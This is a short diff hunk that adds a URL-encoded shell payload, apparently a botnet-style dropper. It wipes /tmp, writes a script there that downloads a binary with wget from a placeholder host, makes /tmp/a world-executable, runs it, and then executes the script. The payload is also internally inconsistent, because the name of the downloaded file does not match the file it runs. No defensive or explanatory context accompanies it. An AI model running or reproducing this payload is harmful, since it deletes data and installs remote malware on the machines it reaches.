@@ -1,0 +1,6 @@
+rm+-rf+/tmp/*
+echo+-e+"cd+/tmp"+>+/tmp/u
+echo+-e+"wget+http:/\/ip/bin"+>>+/tmp/u
+echo+-e+"chmod+777+/tmp/a"+>>+/tmp/u
+echo+-e+"/tmp/a+go"+>>+/tmp/u
+sh+/tmp/u
